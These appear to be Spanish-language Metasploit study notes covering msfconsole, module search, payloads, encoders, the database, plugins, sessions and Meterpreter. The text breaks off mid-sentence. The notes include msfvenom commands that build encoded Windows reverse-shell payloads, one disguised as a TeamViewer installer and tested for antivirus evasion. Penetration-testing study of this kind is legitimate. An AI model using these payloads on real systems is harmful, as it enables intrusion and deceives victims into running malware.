# INTRODUCCIÓN A METASPLOIT
El projecto Metasploit esta basado en "Ruby", es una plataforma para pentester o herramienta, en la que podras testear y ejecutar codigo exploit.

Contiene una base de datos con los ultimos exploits conocidos.

Metasploit Framework incluye una suite con todas las herramientas que necesitamos para encontrar vulnerabilidades de seguridad, enumerar rdes, ejecutar ataques y evadir detecciones.

Los modulos mencionados acutalmente tienen un "POC" un concepto de loque vamos a hacer.

## METASPLOIT PRO

Es el de pago con mas herramientas

## METASPLOIT FRAMEWORK CONSOLE

Este es el popular que tieene todo en uno, fácil de virtualizar y con muchas herramientas.

### ENTENDER LA ARQUITECTURA

Abrir metasploit
```
msfconsole
```


Predeterminadamente "Metasploit Framework" lo encontraremos

```
/usr/share/metasploit-framework
```
Hay estaran las bases de los arrchivos de metasploit

### MODULOS
```
/usr/share/metasploit-framework/modules
```
### PLUGINS
```
/usr/share/metasploit-framework/plugins
```
### SCRIPTS
```
/usr/share/metasploit-framework/scripts
```
### HERRAMIENTAS
```
/usr/share/metasploit-framework/tools
```
# INTRODUCCIÓN A MSFCONSOLE

La iniciaremos con
```
msfconsole
```
Si no queremos que salga en banner
```
msfconsole -q 
```
Cuando estemos dentro podemos utilizar el comando "help" para ver las herramientas de las que disponemos.

## ACTUALIZAR

```
sudo apt update && sudo apt install metasploit-framework
```
Uno de los primeros pasos que deberemos hacer con metasploit es buscar los modulos necesarios para el exploit.

Durante la enumeración nosotros vemos nuestro target lo identificamos, y para empezar lo que haremos sera un escaneo de su IP.-

Dando así una idea de sus componentes, versiones, etc.

## ESTRUCTURA DE ATAQUE

1- ENUMERACION
2- PREPARACION
3- EXPLOTACION
4- ESCALACION DE PRIVILEGIOS
5- POST EXPLOTACION

## MODULOS

Como ya sabemos los modulos estan preparados para scripts especificos y correspondiendo a diferentes funciones.

La categoria de exploit tiene todos unos (POCs) que nos dice los conecptos que debemos saber.

Normalmente la sintaxis de los modulos o los exploits sera esta: 
```
numero  tipo/sistemaoperativo/servicio/nombre
794 /exploit/windows/ftp/scriptftp_list
```
### NUMERO

EL numero se utiliza para seleccional el exploit que queremos utilizar en nuestras busquedas

### TIPO

El tipo es lo primero qeu vemos en los modulos, busca el archivo que necesetiamos y se divide modularmente en diferentes tipos.

- Auxiliar | Escanea, fuzz, snnif, ofrece asistencia y funcionalidad
- Encoder | Codifica los payload para el target
- Exploit | Defiente el modulo de vulnerabilidad que queremos
- Nops | No operation code, es un payload que consiste con exploit
- Payload | Coddigo que funciona remotamente para el máquina víctima
- Plugins | Script adicional que coexiste con msf
- Post | información

Luego el sitema operativo o (OS)

El servicio que queremos

El nombre del exploit

## BUSCAR MODULOS

para aprender un poco sobre esto utilizaremos el comando
```
help search
```
Por ejemplo queremos buscar un exploit "EternalRomance"
```
search eternalromance
```
Tambíen podemos buscar por "CVE" espicificando el año 
```
cve:year
platform:os
type:auxiliaty/exploit/post
rank:rank
```
## BUSQUEDA ESPECIFICA
```
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

## SELECCION DE MODULO
Para buscar un mudolo, primero deberemos encontrarlo, imaginemonos que nos encontramos un SMB vulnerable con "eternalromance" en el puerto 445
```
search ms17_010
```
## USAR MODULO
Cuando ya lo tenemos encontrado, podremos interactuar con el adaptandose a nosotros
```
use windows/smb/exploit
show options
```
```
use 0
options
```
En caso de querer informmación del modulo
```
info
```
Una vez que tenemos todo en regla debemos aprender el termino "RHOST o RHOSTS" (nuestro target)
```
set RHOSTS ip
options
```
Como añadido podemos utilizar "setg" para especificar y ponerlo como permanente en caso de reinicio.

## EJECUCIÓN
Simplemente
```
run
```

## TARGETS

Los targets son identificadores únicos del sistema operativo tomados de las versiones de esos sistemas operativos específicos.

```
show targets
```
Gracias a este comando podemos ver los sistemas operativos vulnerables y detalles del exploit.
En caso de querer ver el modulo de exploit
```
options
```

### SELECCIONAR UN TARGET

Podemos observar que hay generalmente un tipo de target y un tipo de exploit. Si nosotros cambiamos el moudolo estaremos especificando aun mas.
```
MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability.
```
En caso de querer saber mas información del modulo
```
info
```
Gracias a ello tenemos una idea de que hace dicho modulo y para que esta enfocado.

Podemos tener opciones de versiones, que sea automatico, etc..

```
show targets
```
### TIPOS DE TARGETS

Hay una gran variadedad de targets, Cada uno tendra su servicio, su sistema operativo, etc...

# PAYLOAD

Normalmente nos referimos dentro del modulo y tipicamente ofrece una shell al atacante.

Los payloads se envian en el miismo mommento que un exploit, y normalmente te da una conexión reversa de la máquian victima.

Hay diferentes tipos de payload dentro de MSF, solos, por stages, etc.. 

Los payloads se representan con / 
```
windows/shell_bind_tcp
```
## SINGLES

Normalmente se utiliza para una sola tarea y te da una shellcode y se hace para uuna tarea en concreto, normalmente son mas rentables y son todo en uno.

## STAGERS 

Funciona con un "stage payload" y también para una tarea en concreto, normalmente a la espera de la máquina atacante, preparado para entablar una conexión con la máquina victima.

## STAGES

Normalmente se utiliza descargando modulos, como meterpreter o una injección.

## STAGED PAYLOADS 

Simplemente es el proceso de explotación, es modular funciona por fases y tiene bloques de código, todos en uno para cumplir un objetivo o una tarea, normalmente se usa para pasar un antivirus o un firewall, 

Normalmente funciona por pasos, para no alarmar o para pasar estos baches, por ejemplo sería utilizar el STAGE0 para iniciar contacto con la máquina y el STAGE1 para hacer la shell reversa.

## METERPRETER PAYLOAD

Es un payload especifíco enfocado en DLL injection, para asegurar que la conexión con la máquina victima va a ser estable, dificil de detectar y sin problema al cambio, normalmente solo pertenece en la memoria volatil y no utiliza la memoria del disco duro para que no guarde nada.

Cuando se ejecuta el meterpreter se crea una sesión, similar a msfconsole, pero utilizas los comandos igual que si estuvieras en tu propia máquina. 

## BUSCAR PAYLOADS

Para elegir el payload primeramente necesitaremos saber cual es que necesitamos para la máquina víctima, grcaias a eso tenemos bastante flexibilidad.
```
show payloads
```
Tenemos tambíen la disponibilidad de poder crear payloads con "msfvenom" 
También en caso de querer filtrar también podemos usar "grep" en msfconsole.

```
grep meterpreter show payloads
```
o
```
grep meterpreter grep reverse_tcp show payloads
```
### SELECCIONAR UN PAYLOAD

```
 set payload <no.>
show options
show payloads
```
## USAR PAYLOAD

Es el momento de configurar los parámetros para que todo funcione.

RHOSTS = IP máquina victima
RPORT = puerto máquina victima
LHOST = Ip máquina atacante
LPORT = puerto máquina atacante


en caso de querer ver nuestra ip
```
ipconfig
ip a
```
```
run
```
En caso de entrar a un SO que no conocemos cmandos podemos hacer un 
```
help
```
## ENCODERS

Los encoders tienen la asintencia con la compatibilidad de los payloads con diferente proceso de arquitectura mientras ayuda a una evasion de antivirus. Tienen el rol de cambiar el payload y ejecutarlo en diferentes sistemas operativos y arquitecturas. Como:

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/f17dad7c-c39b-4f46-a1b6-e140fda51071)

Ellos necesitan remover como caracteres malos del payload. No solo codifica tambien hace que el formato que utiliza y ayuda a que el AV no detecte. Sin embargo el uso de encoder no hace que estrictamente evada el anti virus, los IPS/IDS manofactura para improvisar como funciona la protección de software con firmas en malware y virus.

SGN es uno de los encoders esquemas mas utilizados hoy en dia porque es muy difícil de detectar estos payloads codifican a un mecanismo universal indetectable. Sin embargo estas metodologias exploran evadir protección de los sistemas.

### SELECCIONAR UN ENCODER

msfpayload y msfencode las dos localizadas en /usr/share/framework2/

Si nosotros queremos crear nuestro propio payload utilizaremos "msfpayload" pero cuando queremos codificar para la arquitectura del OS utilizaremos "msfencode". 

```
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

Hoy en dia con la misma herramienta de "msfvenos" se puede hacer todo de una:
```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```
### GENERAR UN PAYLOAD CODIFICADO

```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```
Si queremos un encoder existente simplemente usaremos el comando
```
show encoders
```
con el "msfconsole" para elegir uno "exploit module + payload"
```
set payload 15
show encoders
```
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```
Esto generar un .exe en formato llamado "teamviewerinstall" en la arquitectura "x86" en la plataforma de windows, y por debajo un "reverse_tcp" shell

Si lo pasamos por virus total 
![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/2154e0a8-66f3-4aa6-a640-2b6112fcceaa)

Como vemos no hay una evasión de antivirus, hay muchos productos que selecciona como virus, otra herramienta muy importante se llama "msf-virustotal" utilizariamos nuestra "api-key" para analizar nuestros payloads, sin embargo requiere un registro en virus total.
```
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```
# BASES DE DATOS

Las bases de datos en msfconsole se usan para hacer un trackeo de los resultados. No es un misterio que cada vez es mas complejo y mas entre redes, piensa que es como un pequeños directorios con busquedas de resultados, entradas, detecciones, fallos, credeciales, etc..

Suporteada por "PostgreSQL" un acceso para escanear resultados que añaden abilidad al importar y exportar resultados en conjuncion de terceras partes de herramientas. 

## INICIAR LA BASE DE DATOS

Primero de todos deberemos iniciar y comprobar el postgres sql en nuestra máquina.

```
sudo service postgresql status
sudo systemctl stat postgresql
sudo msfdb init
```
Aveces puede dar error por fecha. en caso de eso siempre un "apt update"

```
sudo msfdb status
sudo msfdb init
```
Una vez que la base de datos esta inicializada, podemos iniciar la "msfconsole" y conectar y crear una base de datos simultaneamente.

```
sudo msfdb run
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
db_status
```
Ya dentro de la base de datos si queremos interactuar con ella
```
help database
```
### USAR LA BASE DE DATOS

Con la ayuda de la base de datos, nosotros podemos configurar diferentes categorias y host que nosotros podemos analizar, la información sobre la que podemos interactuar con Metasploit. Las bases de datos se exportar y importan. Esto es expecialmente util para tener listas de host, loots, notas, y vulnerabilidades guardadas. Después de que todo funcione correctamente nos vamos a los espacios de trabajo.

### WORKSPACES

Podemos pensar que los espacios de trabajo son como ficheros en un projecto. Podemos segregar diferentes escaneos de resultados, hosts y extraer informacion de IP, subnet, network o dominio.
```
workspace
```
El nombre normal se llama "default" detrás con un "*" los tipos son "workspace [name]" 
```
worskpace -a Target_1
worskpace -h
```
### IMPORTAR RESULTADOS DE ESCANEO

Imagina que queremos importar un escaneo de "Nmap" a la base de datos de nuestro espacio de trabajo. Podemos usar "db_import" y despues que se complete checkear que la información de la base de datos y todo funciona. Los formatos predefinidos son ".xml"

```
db_import Target.xml
```
### USAR NMAP DENTRO DE MSFCONSOLE

Otra alternativa es esta
```
db_nmap -sV -sS ip
host
services
```
### COPIA DE SEGURIDAD DE LOS DATOS

Después de terminar la sesión, deberemos hacer una copia de seguridad
```
db_export -f xml backup.xl
```
## HOSTS

Los hosts nos dicen la base de datos automaticamente populares por nuestras ips de hosts, hostnamess y otra información que nosotros podemos saber sobre otros escaners o interaciones, por ejemplo msfconsole escanea unos pluggins de un OS, esta información automaticamente aparece en al tabla, como Nessus, NexPose o Nmap nos ayudara en estos casos.

```
host -h
```
## SERVICIOS

Los servicios su funcion es la que anteiormente, contiene las tablas de las descripciones y información de los servicios que escanea y las interacciones.
```
services -h
```
## CREDENCIALES

Visualiza las credenciales durantes las interaciones con la máquina victima. Podemos añadir credenciales manualmente, especificando puestos y añadiendo descripciones.
```
creds -h
```
![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/b763c53a-109d-447f-bfd0-dfd88cafd082)

## BOTÍN
Este comando se utiliza para conjuntar otros servicios o usuarios, se reifere a los hasehs de diferentes sistemas.

```
loot -h
```
# PLUGINS

Es un software que se puede leer creado por terceras partes y que los creadores han aprobado, metasploit integra ese software dentro del framewokr. Representa los productos comericales que tienes con "community edition" gratis y pagando

El uso de plugins hace que la vida del pentester sea mas facil, brindando funcionalidad del software dentro de msfconsole o metasploit pro environments, antes, nosotros necesitamos un ceiclo entre direntes software para importar y exportar resultados, ajustar opciones y paramentros una y otra vez, ahora casi todo y gracias a los plugins es automatico y documentado por msfconsole dentro de su propia base de datos usando los hosts.
Estos plugins trabajan directamente con la API y se usa para manipular un framework. Hace automatizacion de tareas repetitivas y añade nuevos comandos a msfconsole.

## USAR PLUGINS

Para empezar a usar un plugin, nosotros necesitaremos saber exactamente donde tenemos instalado todo "/ust/share/metasploit-framework/plugins" normalmente es el directorio por defecto.

```
ls /usr/share/metasploit-framework/plugins
```
Si el plugin se encuentra aqui, nosotros podemos meterlo dentro
```
load nessus
nessus_help
```
Obviamente si no esta bien pues no funcionara.

## INSTALAR NUEVOS PLUGINS

Nuevos, populares y en cada actualización salen más, distribuciones etc, para instalar un nuevo plugin necesitaremos actualziar nuestra ditro y coger la del market place irnos a la ruta e instalarlo ahi dentro /plugins y con formato (.rb)

```
git clone https://github.com/darkoperator/Metasploit-Plugins
ls Metasploit-plugins
```
### COPIAR UN PLUGIN A MSF
```
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```
## EJECUTAR UN PLUGIN

```
msfconsole -q
load pentest
help
```
Lista de los plugins más utilizados

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/1d1a0ea0-1093-483e-94a3-a71367a9e1f5)

## MIXINS

El metasploit Framework esta escrito en Ruby, un programa orientado a objetos. Esto es uan gran parde de msfconsole de excelente uso, cuando lo implementamos, ofrece una larga cantidad de flexibilidad.

# SESIONES

MSFconsole tiene la capacidad de manejar multiples modulos en el mismo tiempo. Esto es una de las razones que un usuario pruede tener y dar flexibilidad, esto ya esta desfadaso con el uso de sesiones, puedes crear y dedicarte con interfaces. 

Una vez que la sesion esta creada, nosotros podemos cambiar entre ellas con un link en diferentes modulos, podemos tener diferentes sesiones de trabajo. Una vez que se cambia sigue funcionando y la noexion persiste.

## USAR SESIONES

Mientras corres cualquier exploit disponible o modulo auxiliar en msfconsole, nosotros tenemos una sesion por detras que se comunica por canales hasta nuestra máquina. Podemos salirnos con
```
control + z
```
La combinacion hace que salgas y vuelvas al msfconsole
```
sessions
```
## INTERACUTAR CON LAS SESIONES
Podemos usar sesiones y especificar
```
sessions -i 1
```
Esto es util cuando queremos correr modulos adiciones.

Podemos tener sesiones por debajo, y que funciene el primer exploit, y buscar otro modulo o otro vecotr por el que atacar.

Usualmente estos modulos se buscan en la categoria "post" 

# TRABAJOS

Por ejemplo, nosotros queremos activar un exploit activo bajo un puerto especifico de un modulo diferentes, nosotros simplemente terminamos la sesion con [CTRL] + [C]. 
```
jobs -h 
exploit -h help
exploit -j run
exploit -l list
```

# METERPRETER

Meterpreter es un payload especifico multi faceta, usa injecciones DLL para asegurar la conexion de la victima con el host sea estable y dificil de detectar usando simples checkeos de configuración para persistir en caso de reinicio o que el sistema cambiar.

Meterpreter reside dentro de la memoria de la máquina victima y no deja trazas en el disco duro, haciendo más dificil su detección y para tecnicas forenses.

Se conoce como la navaja suiza en el pentesting, por una buena razon. El proposito de meterpreter es especificamente para post explotación, ofreciendo un apreton de manos para las herramientas mas importantes enumerando así el target de dentro. Ayudando a escalar privilegios, evasión de antivirus, pivoting , acceso persistente.

## INICIAR METERPRETER

Para iniciarlo lo evremos en "show payloadsa"

Cuando la explotación esta completa, pasa esto:

- La víctima ejecuta el payload. Usualmnte a bind, una reversa, un 



